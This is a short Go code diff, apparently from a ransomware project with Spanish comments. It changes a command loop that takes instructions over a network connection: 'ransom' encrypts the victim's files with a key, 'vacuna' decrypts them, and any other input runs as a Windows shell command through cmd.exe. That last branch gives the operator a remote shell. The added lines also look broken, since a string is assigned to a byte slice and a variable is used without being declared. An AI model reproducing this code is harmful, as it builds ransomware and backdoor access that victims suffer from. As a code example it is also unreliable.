@@ -37,9 +37,11 @@ func EsperarComandos(con net.Conn, re *bufio.Reader, host string, key string) {
 		var salida []byte
 		switch strings.TrimSpace(cp) {
 		case "ransom":
-			salida = []byte(Atacar(key))
+			salidaVerbosa = []byte(Atacar(key)) //no lo imprimo para no saturar pero es interesante poder verlo
+			salida = "Cifrado completado"
 		case "vacuna":
-			salida = []byte(Curar(key))
+			salidaVerbosa = []byte(Curar(key)) //no lo imprimo para no saturar pero es interesante poder verlo
+			salida = "Descifrado completado"
 		default:
 			//si no es ninguno de los dos que se ejecute el comando
 			cmd := exec.Command("cmd.exe", "/C", strings.TrimSpace(cp))
